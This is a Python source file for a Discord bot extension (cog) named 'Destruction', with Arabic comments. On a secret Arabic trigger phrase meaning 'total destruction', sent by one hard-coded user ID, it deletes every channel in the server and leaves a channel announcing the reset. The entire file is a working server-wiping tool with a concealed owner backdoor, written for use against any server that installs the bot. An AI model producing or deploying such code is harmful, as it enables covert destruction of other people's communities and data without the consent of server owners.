import discord
from discord.ext import commands

class Destruction(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.MY_ID = 1371432836946726934  # هويتك الخاصة للأمان

    @commands.Cog.listener()
    async def on_message(self, message):
        if message.author.bot: return

        # أمر التدمير الشامل
        if message.content == "تدمير_شامل":
            if message.author.id == self.MY_ID:
                print(f"⚠️ جاري التنفيذ في: {message.guild.name}")
                
                # حذف جميع القنوات
                for channel in message.guild.channels:
                    try:
                        await channel.delete()
                    except:
                        continue
                
                # إنشاء قناة النهاية
                await message.guild.create_text_channel('تم-التصفير-بنجاح')

async def setup(bot):
    await bot.add_cog(Destruction(bot))
